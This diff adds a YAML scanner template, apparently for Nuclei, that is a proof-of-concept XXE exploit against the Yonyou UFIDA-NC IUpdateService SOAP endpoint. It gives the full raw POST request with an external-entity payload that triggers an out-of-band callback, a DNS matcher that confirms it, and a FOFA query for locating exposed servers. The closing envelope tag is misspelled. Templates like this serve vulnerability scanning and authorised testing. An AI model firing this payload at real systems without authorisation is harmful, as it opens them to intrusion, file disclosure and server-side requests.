@@ -1,0 +1,47 @@
+id: poc-local-oa-yonyou-nc-uapws-IUpdateService-xxe-post
+
+info:
+  name: poc-local-oa-yonyou-nc-uapws-IUpdateService-xxe-post
+  author: capiton
+  severity: high
+  description: "用友NC UFIDA-NC IUpdateService存在xxe漏洞"
+  reference:
+    - ""
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+    Vulnerability-Impact: 用友NC UFIDA-NC
+  tags: yonyou,oa
+
+
+requests:
+  - raw:
+      - |
+        POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <iup:getResult>
+        <!--type: string-->
+        <iup:string>
+        <![CDATA[<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://{{interactsh-url}}">%aaa;]><xxx/>]]>
+        </iup:string>
+        </iup:getResult>
+        </soapenv:Body>
+        </soapenv:Envelop>
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
